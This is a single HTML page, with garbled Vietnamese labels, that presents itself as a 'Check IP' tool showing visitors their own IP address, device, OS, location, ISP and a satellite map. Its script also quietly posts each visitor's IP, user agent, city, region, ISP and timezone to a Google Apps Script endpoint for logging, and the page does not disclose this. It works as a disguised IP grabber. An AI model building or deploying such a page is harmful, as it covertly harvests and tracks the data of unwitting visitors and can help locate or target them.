
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />

  <title>Check IP - VIP</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;

      flex-direction: column;

    }
    h1 {
      color: #0077cc;
    }
    .card {
      background: #fff;
      padding: 2rem;
      border-radius: 16px;
      box-shadow: 0 0 16px rgba(0,0,0,0.1);
      max-width: 600px;
      width: 100%;
    }
    .info-item {
      margin: 10px 0;
      font-size: 1.1rem;
    }
    #map {
      margin-top: 1rem;
      width: 100%;
      height: 400px;
      border-radius: 12px;
    }
  </style>
</head>
<body>
  <h1>ğŸ›°ï¸ Kiá»ƒm Tra IP + Vá»‹ TrÃ­</h1>
  <div class="card">
    <div class="info-item"><strong>ğŸŒ IP:</strong> <span id="ip"></span></div>
    <div class="info-item"><strong>ğŸ’» Thiáº¿t bá»‹:</strong> <span id="device"></span></div>
    <div class="info-item"><strong>ğŸ§  Há»‡ Ä‘iá»u hÃ nh:</strong> <span id="os"></span></div>
    <div class="info-item"><strong>ğŸ“ Vá»‹ trÃ­:</strong> <span id="location"></span></div>
    <div class="info-item"><strong>ğŸ¢ NhÃ  máº¡ng:</strong> <span id="isp"></span></div>
    <div class="info-item"><strong>ğŸ•“ MÃºi giá»:</strong> <span id="timezone"></span></div>
    <div id="map"></div>
  </div>

  <script>
    const userAgent = navigator.userAgent;
    document.getElementById("device").textContent = userAgent;

    function detectOS(ua) {
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac OS")) return "macOS";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
      if (ua.includes("Linux")) return "Linux";
      return "KhÃ´ng rÃµ";
    }

    document.getElementById("os").textContent = detectOS(userAgent);

    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        document.getElementById("ip").textContent = data.ip;
        document.getElementById("location").textContent = `${data.city}, ${data.region}`;
        document.getElementById("isp").textContent = data.org;
        document.getElementById("timezone").textContent = data.timezone;

        const lat = data.latitude;
        const lon = data.longitude;
        const map = document.getElementById("map");
        const iframe = document.createElement("iframe");
        iframe.src = `https://www.google.com/maps?q=${lat},${lon}&t=k&z=15&output=embed`;
        iframe.width = "100%";
        iframe.height = "400";
        iframe.style.border = "0";
        map.appendChild(iframe);

        // Gá»­i dá»¯ liá»‡u vá» Google Sheet
        const logData = {
          ip: data.ip,
          device: userAgent,
          os: detectOS(userAgent),
          city: data.city,
          region: data.region,
          isp: data.org,
          timezone: data.timezone
        };

        fetch("https://script.google.com/macros/s/AKfycbww3s8aLGxURN6CRnUxTAJ5RZVseio9t4yZSZ1R-NTsNwYxTF8L_iIuaidJaB9PS-_0/exec", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(logData)
        })
        .then((res) => res.text())
        .then((res) => console.log("ÄÃ£ lÆ°u dá»¯ liá»‡u:", res))
        .catch((err) => console.error("Lá»—i lÆ°u dá»¯ liá»‡u:", err));
      });
  </script>
</body>
